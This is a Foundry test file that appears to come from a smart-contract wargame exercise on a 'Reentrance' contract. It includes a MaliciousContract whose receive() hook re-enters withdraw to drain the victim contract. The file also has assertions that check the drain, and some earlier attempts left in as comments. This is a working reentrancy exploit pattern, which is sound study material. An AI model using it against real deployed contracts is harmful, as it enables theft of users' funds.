//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Reentrance, Attack} from "../src/level11.sol";

contract ReentranceTest is Test {
    Reentrance public reentrance;
    Attack public _attack;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(victim, 100 ether);
        reentrance = new Reentrance();
        _attack = new Attack(reentrance);
        vm.startPrank(victim);
        reentrance.donate{value: 1 ether}(victim);
        vm.stopPrank();
        // vm.startPrank(attacker);
        // reentrance.donate{value: 15 ether}(attacker);
        // vm.stopPrank();
    }

    // function test_Reentrancy() public {
    //     vm.startPrank(attacker);
    //     uint256 balanceBefore = address(_attack).balance;
    //     uint256 _reentrantbalance = address(reentrance).balance;
    //     // Attack the contract
    //     _attack.attack{value: 1 ether}();
    //     vm.stopPrank();

    //     // Check if the attack was successful
    //     assertEq(address(reentrance).balance, 0);
    //     assertEq(address(_attack).balance, balanceBefore + _reentrantbalance);
    // }

    function test_attack() public {
        vm.startPrank(attacker);
        MaliciousContract malicious = new MaliciousContract(reentrance);
        uint256 balanceBefore = address(malicious).balance;
        uint256 _reentrantbalance = address(reentrance).balance;
        vm.expectRevert("arithmetic underflow or overflow");
        malicious.attack{value: 1 ether}();
        assertEq(address(reentrance).balance, 0);
        assertEq(address(malicious).balance, balanceBefore + _reentrantbalance);

        vm.stopPrank();
    }
}

contract MaliciousContract {
    Reentrance public reentrance;

    constructor(Reentrance _reentrance) {
        reentrance = _reentrance;
    }

    function attack() external payable {
        console.log("balance of the contract before", address(this).balance);
        reentrance.donate{value: msg.value}(address(this));
        console.log("successfuly donated");
        console.log("balance of reentrance: ", address(reentrance).balance);
        console.log("balance of this contract: ", address(this).balance);

        reentrance.withdraw(msg.value);
    }

    // receive() external payable {
    //     if (address(reentrance).balance > 1 ether) {
    //         reentrance.withdraw(msg.value);
    //         console.log("balance of reentrance: ", address(reentrance).balance);
    //         console.log("balance of the contract after", address(this).balance);
    //     }
    // }
    receive() external payable {
        uint256 bal = reentrance.balanceOf(address(this));
        if (address(reentrance).balance > 0 && bal > 0) {
            uint256 toWithdraw = bal < 1 ether ? bal : 1 ether;
            reentrance.withdraw(toWithdraw);
        }
    }
}
